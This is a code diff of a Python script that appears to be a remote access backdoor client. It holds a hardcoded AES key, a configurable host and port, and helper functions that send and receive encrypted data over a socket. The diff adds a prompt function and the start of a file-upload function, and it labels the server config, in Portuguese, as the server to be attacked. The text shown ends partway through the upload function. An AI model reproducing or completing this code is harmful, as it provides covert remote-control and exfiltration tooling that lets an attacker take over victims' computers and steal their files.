@@ -1,4 +1,3 @@
-#!/usr/bin/python
 from Crypto.Cipher import AES
 import subprocess, socket, base64, time, os, sys, urllib2, pythoncom
 
@@ -9,7 +8,7 @@ DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 
 secret_key = "TkcR4sa2zA4A1c3Fg7s3D4s2A4s2A4s2"
 
-# your server config
+# your server config(configure o servidor para ser atacado)
 HOST = '255.255.255.255'
 PORT = 8000
 
@@ -33,3 +32,10 @@ def receive_data_from_server(sock):
 
     return data[:-len(end)]
 
+def prompt(sock, promptmsg):
+    send_data_to_server(sock, promptmsg)
+    answer = receive_data_from_server(sock)
+    return answer
+
+def upload_file(sock, file_name):
+    bgrt = True
